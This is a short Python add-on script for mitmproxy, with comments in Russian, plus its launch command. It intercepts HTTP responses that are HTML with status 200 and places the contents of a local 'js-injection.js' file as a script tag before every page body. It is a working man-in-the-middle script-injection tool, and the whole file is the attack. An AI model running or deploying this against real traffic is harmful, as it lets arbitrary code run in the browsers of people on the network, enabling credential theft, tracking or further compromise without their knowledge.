#Команда для запуска прокси-сервера: mitmdump -p 8080 -s "proxy-server.py"

from mitmproxy import options
from mitmproxy import ctx
#Получаем javascript для инъекции
with open('js-injection.js', 'r') as f:
    content_js = f.read()

def response(flow):
    #Продолжаем работу только если в ответе содержится html и код ответа 200
    if flow.response.headers['Content-Type'] != 'text/html':
        ctx.log.info('1')
        return
    if not flow.response.status_code == 200:
        ctx.log.info('2')
        return

    #Делаем инъекцию
    html = flow.response.text
    flow.response.text = "<script type=text/javascript>" + content_js + "</script>" + html
    ctx.log.info('Successfully injected the content.js script.')